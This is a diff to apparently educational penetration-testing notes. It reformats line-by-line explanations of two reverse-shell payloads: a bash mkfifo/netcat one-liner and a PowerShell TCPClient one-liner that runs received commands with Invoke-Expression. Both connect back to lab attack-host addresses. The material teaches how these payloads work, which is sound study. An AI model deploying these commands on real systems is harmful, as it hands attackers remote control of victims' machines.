@@ -168,11 +168,16 @@ In InfoSec, the payload is the command and/or code that exploits the vuln in an 
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
 
-# rm -f /tmp/f; -> removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files; the semi-colon is used to execute the command sequentially
-# mkfifo /tmp/f; -> makes a FIFO named pipe file at the location specified
-# cat /tmp/f | -> concatenates the FIFO named pipe file /tmp/f, the pipe connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe
-# /bin/bash -i 2>&1 | -> specifies the command language interpreter using the -i option to ensure the shell is interactive; 2>&1 ensures the standard error data stream and standard output data stream are redirected to the command following the pipe
-# nc 10.10.14.12 7777 > /tmp/f -> uses nc to send a connection to your attack host; the output will be redirected to /tmp/f, serving the bash shell to your waiting nc listener
+rm -f /tmp/f;
+# -> removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files; the semi-colon is used to execute the command sequentially
+mkfifo /tmp/f; 
+# -> makes a FIFO named pipe file at the location specified
+cat /tmp/f |
+# -> concatenates the FIFO named pipe file /tmp/f, the pipe connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe
+/bin/bash -i 2>&1 | 
+# -> specifies the command language interpreter using the -i option to ensure the shell is interactive; 2>&1 ensures the standard error data stream and standard output data stream are redirected to the command following the pipe
+nc 10.10.14.12 7777 > /tmp/f
+# -> uses nc to send a connection to your attack host; the output will be redirected to /tmp/f, serving the bash shell to your waiting nc listener
 ```
 
 #### PowerShell One Liner
@@ -180,15 +185,25 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 777
 ```ps
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
-# powershell -nop -c -> executes powershell.exe with no profile and executes the command/script block contained in the quotes
-# "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443); -> sets/evaluates the variable $client equal to the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object; the .NET framework object will connect with the TCP socket listed in the parantheses; the semi-colon ensures the commands & code are executed sequentially
-# $stream = $client.GetStream(); -> sets/evaluates the variable $stream equal to the $client variable and the .NET framework method called GetStream that facilitates network communications; the semi-colon ensures the commands & code are executed sequentially
-# [byte[]]$bytes = 0..65535|%{0}; -> creates a byte type array called $bytes that returns 65,535 zeros as the values in the array; this is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection
-# while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) -> starts a while loop containing the $i variable set equal to the .NET framework Stream.Read method; the parameters: buffer, offset, and count are defined inside the parantheses of the method
-# {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); -> sets/evaluates the variable $data equal to an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream into ASCII
-# $sendback = (iex $data 2>&1 | Out-String ); -> sets/evaluates the variable $sendback equal to the Invoke-Expression cmdlet against the $data variable, then redirects the standard error and standard output through a pipe to the Out-String cmdlet which converts input objects into strings; because Invoke-Expression is used, everything stored in $data will be run on the local computer
-# $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; -> sets/evaluates the variable $sendback2 equal to the $sendback variable plus the string PS plus path to the working directory plus the string '> '; this will result in the shell prompt being PS C:\workingdirectoryofmachine >
-# $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}; -> sets/evaluates the variable $sendbyte equal to the ASCII encoded byte stream that will use a TCP client to initiate a PS session with a nc listener running on the sandbox
-# $client.Close()" -> this is the TcpClient.Close method that will be used when the connection is terminated
+powershell -nop -c
+# -> executes powershell.exe with no profile and executes the command/script block contained in the quotes
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
+# -> sets/evaluates the variable $client equal to the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object; the .NET framework object will connect with the TCP socket listed in the parantheses; the semi-colon ensures the commands & code are executed sequentially
+$stream = $client.GetStream();
+# -> sets/evaluates the variable $stream equal to the $client variable and the .NET framework method called GetStream that facilitates network communications; the semi-colon ensures the commands & code are executed sequentially
+[byte[]]$bytes = 0..65535|%{0};
+# -> creates a byte type array called $bytes that returns 65,535 zeros as the values in the array; this is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+# -> starts a while loop containing the $i variable set equal to the .NET framework Stream.Read method; the parameters: buffer, offset, and count are defined inside the parantheses of the method
+{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+# -> sets/evaluates the variable $data equal to an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream into ASCII
+$sendback = (iex $data 2>&1 | Out-String );
+# -> sets/evaluates the variable $sendback equal to the Invoke-Expression cmdlet against the $data variable, then redirects the standard error and standard output through a pipe to the Out-String cmdlet which converts input objects into strings; because Invoke-Expression is used, everything stored in $data will be run on the local computer
+$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+# -> sets/evaluates the variable $sendback2 equal to the $sendback variable plus the string PS plus path to the working directory plus the string '> '; this will result in the shell prompt being PS C:\workingdirectoryofmachine >
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
+# -> sets/evaluates the variable $sendbyte equal to the ASCII encoded byte stream that will use a TCP client to initiate a PS session with a nc listener running on the sandbox
+$client.Close() 
+# -> this is the TcpClient.Close method that will be used when the connection is terminated
 ```
 
